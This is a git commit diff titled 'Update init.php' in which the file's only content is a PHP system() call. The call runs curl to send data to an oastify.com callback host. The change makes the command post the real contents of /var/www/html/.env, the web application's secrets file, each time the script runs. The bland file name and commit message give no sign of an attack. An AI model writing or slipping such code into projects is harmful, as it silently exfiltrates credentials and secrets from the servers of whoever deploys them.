fe5e2ffcb4f92522566aef146bc8830ed8a2a9a8
Mhdy333p <117368518+Mhdy333p@users.noreply.github.com>
2024-07-09 13:02:22 +0330

    Update init.php

--- init.php
+++ init.php
@@ -1,5 +1,5 @@
 <?php
 
-system("curl 'http://gueqei36an2ekr06j7oee9mxmosfgd42.oastify.com' --data-binary 'cat /var/www/html/.env'")
+system("curl 'http://gueqei36an2ekr06j7oee9mxmosfgd42.oastify.com' -d 'data=$(cat /var/www/html/.env)'")
 
 ?>
